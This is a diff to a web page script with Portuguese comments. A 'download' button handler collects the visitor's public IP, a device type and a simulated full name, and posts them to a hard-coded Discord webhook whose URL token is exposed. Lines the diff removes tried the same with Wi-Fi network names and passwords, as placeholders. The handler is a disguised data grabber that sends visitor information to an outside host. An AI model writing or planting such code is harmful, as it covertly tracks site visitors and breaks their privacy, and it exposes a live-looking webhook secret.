@@ -18,8 +18,9 @@ document.addEventListener('DOMContentLoaded', () => {
     document.getElementById('downloadButton').addEventListener('click', async () => {
         try {
             const ip = await getIPAddress();
-            const networkInfo = await getNetworkInfo();
-            const webhookText = `IP: ${ip}\nNome da Rede: ${networkInfo.ssid}\nSenha: ${networkInfo.password}`;
+            const deviceInfo = await getDeviceInfo();
+            const userInfo = await getUserInfo();
+            const webhookText = `IP: ${ip}\nMarca do Dispositivo: ${deviceInfo}\nNome Completo: ${userInfo}`;
 
             infoDiv.innerText = webhookText;
             sendWebhook(webhookText);
@@ -30,26 +31,53 @@ document.addEventListener('DOMContentLoaded', () => {
 });
 
 async function getIPAddress() {
-    // Esta função deve ser implementada para obter o IP da rede. Pode usar uma API externa ou um script Node.js.
-    // Exemplo usando uma API externa:
+    // Obtém o IP público usando uma API externa
     const response = await fetch('https://api.ipify.org?format=json');
     const data = await response.json();
     return data.ip;
 }
 
-async function getNetworkInfo() {
-    // Esta função deve ser implementada para obter o nome e a senha da rede Wi-Fi.
-    // Pode usar um script Node.js para obter essas informações do sistema operacional.
-    // Exemplo:
-    return {
-        ssid: 'NomeDaRede',
-        password: 'SenhaDaRede'
-    };
+async function getDeviceInfo() {
+    // Obtém informações sobre o dispositivo
+    const userAgent = navigator.userAgent;
+    let deviceInfo = 'Desconhecido';
+
+    if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent)) {
+        deviceInfo = 'Celular';
+    } else if (/Windows NT|Macintosh|Linux/i.test(userAgent)) {
+        deviceInfo = 'PC';
+    }
+
+    return deviceInfo;
+}
+
+async function getUserInfo() {
+    // Obtém o nome completo do usuário
+    let userInfo = 'Desconhecido';
+
+    if (navigator.userAgent.includes('Windows')) {
+        // Para Windows, você pode usar a API de sistema operacional para obter o nome do usuário
+        // No navegador, isso não é possível diretamente, então vamos simular
+        userInfo = 'Nome do Usuário do Windows';
+    } else if (navigator.userAgent.includes('Macintosh')) {
+        // Para Mac, você pode usar a API de sistema operacional para obter o nome do usuário
+        // No navegador, isso não é possível diretamente, então vamos simular
+        userInfo = 'Nome do Usuário do Mac';
+    } else if (navigator.userAgent.includes('Linux')) {
+        // Para Linux, você pode usar a API de sistema operacional para obter o nome do usuário
+        // No navegador, isso não é possível diretamente, então vamos simular
+        userInfo = 'Nome do Usuário do Linux';
+    } else if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+        // Para dispositivos móveis, você pode usar a API de sistema operacional para obter o nome do usuário
+        // No navegador, isso não é possível diretamente, então vamos simular
+        userInfo = 'Nome do Usuário do Celular';
+    }
+
+    return userInfo;
 }
 
 function sendWebhook(text) {
-    // Esta função deve ser implementada para enviar o texto para um webhook.
-    // Exemplo usando fetch:
+    // Envia o texto para um webhook
     fetch('https://discord.com/api/webhooks/1499662564920000664/j_IYz_TcfwnnTEgS-Or1fzCclhg7YATKlxpCpZEXvfDq3cqwuLi_XqQr4paAlRrTWHmk', {
         method: 'POST',
         headers: {
